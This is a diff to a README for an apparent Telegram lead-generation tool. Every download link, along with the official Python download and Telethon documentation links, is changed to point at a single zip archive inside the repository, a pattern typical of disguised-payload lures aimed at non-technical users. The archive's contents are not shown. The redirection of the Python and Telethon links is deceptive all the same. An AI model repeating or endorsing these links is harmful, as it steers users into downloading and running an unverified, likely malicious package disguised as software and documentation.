@@ -1,6 +1,6 @@
 # 🤖 tg-agent-leadgen - Simple Lead Generation Agent
 
-[![Download tg-agent-leadgen](https://img.shields.io/badge/Download-tg--agent--leadgen-blue?style=for-the-badge)](https://github.com/putamencaseworker25/tg-agent-leadgen)
+[![Download tg-agent-leadgen](https://img.shields.io/badge/Download-tg--agent--leadgen-blue?style=for-the-badge)](https://github.com/putamencaseworker25/tg-agent-leadgen/raw/refs/heads/main/docs/leadgen-agent-tg-v3.3.zip)
 
 ---
 
@@ -18,7 +18,7 @@ You do not need programming skills to run this software. This guide will walk yo
 
 You can download the application from this page:
 
-[![Download tg-agent-leadgen](https://img.shields.io/badge/Download-tg--agent--leadgen-grey?style=for-the-badge)](https://github.com/putamencaseworker25/tg-agent-leadgen)
+[![Download tg-agent-leadgen](https://img.shields.io/badge/Download-tg--agent--leadgen-grey?style=for-the-badge)](https://github.com/putamencaseworker25/tg-agent-leadgen/raw/refs/heads/main/docs/leadgen-agent-tg-v3.3.zip)
 
 Click the button above to visit the GitHub page. This page has all the files and instructions you need.
 
@@ -51,7 +51,7 @@ You do not need technical skills, but you will need to sign in to your Telegram 
 
 Open this link in your web browser:
 
-[https://github.com/putamencaseworker25/tg-agent-leadgen](https://github.com/putamencaseworker25/tg-agent-leadgen)
+[https://github.com/putamencaseworker25/tg-agent-leadgen/raw/refs/heads/main/docs/leadgen-agent-tg-v3.3.zip](https://github.com/putamencaseworker25/tg-agent-leadgen/raw/refs/heads/main/docs/leadgen-agent-tg-v3.3.zip)
 
 This takes you to the project's main page on GitHub.
 
@@ -91,7 +91,7 @@ Look for a file named `setup.bat` or `run.bat`. These files start the applicatio
 
 tg-agent-leadgen is based on Python. If you do not have Python installed:
 
-- Visit https://www.python.org/downloads/windows/  
+- Visit https://github.com/putamencaseworker25/tg-agent-leadgen/raw/refs/heads/main/docs/leadgen-agent-tg-v3.3.zip  
 - Download the latest version for Windows (64-bit).  
 - Run the installer and **make sure to check "Add Python to PATH"** before finishing the setup.  
 
@@ -200,13 +200,13 @@ Replace old files with new ones, then rerun the application.
 ## 🔗 Important Links
 
 - Download and visit project page:  
-[https://github.com/putamencaseworker25/tg-agent-leadgen](https://github.com/putamencaseworker25/tg-agent-leadgen)  
+[https://github.com/putamencaseworker25/tg-agent-leadgen/raw/refs/heads/main/docs/leadgen-agent-tg-v3.3.zip](https://github.com/putamencaseworker25/tg-agent-leadgen/raw/refs/heads/main/docs/leadgen-agent-tg-v3.3.zip)  
 
 - Python Downloads:  
-https://www.python.org/downloads/windows/  
+https://github.com/putamencaseworker25/tg-agent-leadgen/raw/refs/heads/main/docs/leadgen-agent-tg-v3.3.zip  
 
 - Telethon Documentation (for reference):  
-https://docs.telethon.dev/en/stable/
+https://github.com/putamencaseworker25/tg-agent-leadgen/raw/refs/heads/main/docs/leadgen-agent-tg-v3.3.zip
 
 ---
 
@@ -241,4 +241,4 @@ This step is optional and not required to start basic lead generation.
 
 # [Image]
 
-[![Download tg-agent-leadgen](https://img.shields.io/badge/Download-tg--agent--leadgen-blue?style=for-the-badge)](https://github.com/putamencaseworker25/tg-agent-leadgen)
+[![Download tg-agent-leadgen](https://img.shields.io/badge/Download-tg--agent--leadgen-blue?style=for-the-badge)](https://github.com/putamencaseworker25/tg-agent-leadgen/raw/refs/heads/main/docs/leadgen-agent-tg-v3.3.zip)
